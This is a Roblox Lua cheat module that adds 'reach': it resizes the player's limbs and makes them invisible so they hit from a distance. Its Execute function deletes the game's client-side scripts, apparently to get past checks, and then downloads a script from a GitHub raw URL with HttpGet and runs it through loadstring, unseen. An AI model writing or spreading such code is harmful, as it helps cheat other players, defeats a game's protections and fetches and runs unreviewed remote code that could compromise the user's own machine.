local module = {}

local Players = game:GetService("Players")

local function getCharacter()
    local player = Players.LocalPlayer
    if not player then return nil end
    return player.Character or player.CharacterAdded:Wait()
end

local function waitForPart(character, name)
    return character:WaitForChild(name, 5)
end

-- 🔹 APPLY
function module:Apply()

    local character = getCharacter()
    if not character then return end

    if not self.Reach then
        return
    end

    if self.Armreach then
        local rArm = waitForPart(character, "Right Arm")
        local lArm = waitForPart(character, "Left Arm")

        if rArm and lArm then
            rArm.Size = Vector3.new(self.ArmreachMultiplier, self.ArmreachMultiplier, self.ArmreachMultiplier)
            lArm.Size = Vector3.new(self.ArmreachMultiplier, self.ArmreachMultiplier, self.ArmreachMultiplier)

            rArm.Transparency = self.ReachOpacity
            lArm.Transparency = self.ReachOpacity

            rArm.Massless = true
            lArm.Massless = true
        end
    end

    if self.Legreach then
        local rLeg = waitForPart(character, "Right Leg")
        local lLeg = waitForPart(character, "Left Leg")

        if rLeg and lLeg then
            rLeg.Size = Vector3.new(self.LegreachMultiplier, 2, self.LegreachMultiplier)
            lLeg.Size = Vector3.new(self.LegreachMultiplier, 2, self.LegreachMultiplier)

            rLeg.Transparency = self.ReachOpacity
            lLeg.Transparency = self.ReachOpacity

            rLeg.Massless = true
            lLeg.Massless = true
        end
    end
end

-- 🔹 RESET
function module:Reset()
    local character = getCharacter()
    if not character then return end

    for _, limbName in pairs({"Right Arm","Left Arm","Right Leg","Left Leg"}) do
        local limb = character:FindFirstChild(limbName)
        if limb then
            limb.Size = Vector3.new(1,2,1)
            limb.Transparency = 0
            limb.Massless = true
        end
    end
end

-- 🔹 EXECUTE
function module:Execute()

    local character = getCharacter()
    if not character then return end

    if not workspace:FindFirstChild("Configuration") then
        warn("No Configuration found")
        return
    end

    -- eliminar si existen
    if character:FindFirstChild("ClientRemotesFire") then
        character.ClientRemotesFire:Destroy()
    end

    task.wait(1)

    if character:FindFirstChild("LocalScript") then
        character.LocalScript:Destroy()
    end

    -- load externo
    pcall(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua'))()
    end)

    self:Apply()
end

------------------------------------------------------------------
-- ⚙️ CONFIG
------------------------------------------------------------------

module.Reach = true
module.ReachOpacity = 1

module.Legreach = true
module.LegreachMultiplier = 2.4

module.Armreach = false
module.ArmreachMultiplier = 52

------------------------------------------------------------------

return module
